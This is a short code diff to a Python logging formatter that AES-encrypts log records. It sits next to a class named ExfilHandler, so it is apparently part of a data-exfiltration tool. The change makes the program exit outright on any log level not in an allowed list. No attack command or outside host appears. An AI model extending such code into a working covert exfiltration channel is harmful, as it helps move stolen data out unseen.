@@ -66,14 +66,11 @@ class CryptoFormatter(logging.Formatter):
             logging.ERROR,
             logging.INFO,
             logging.WARNING)
-        if record.levelno in levels:
-            encrypted = self.aes.encrypt(
-                bytes(
-                    logging.Formatter.format(
-                        self,
-                        record),
-                    'utf8'))
-            return encrypted.decode('utf8')
+        if record.levelno not in levels:
+            sys.exit(1)
+        encrypted = self.aes.encrypt(
+            bytes(logging.Formatter.format(self, record), 'utf8'))
+        return encrypted.decode('utf8')
 
 
 class ExfilHandler(logging.handlers.MemoryHandler):
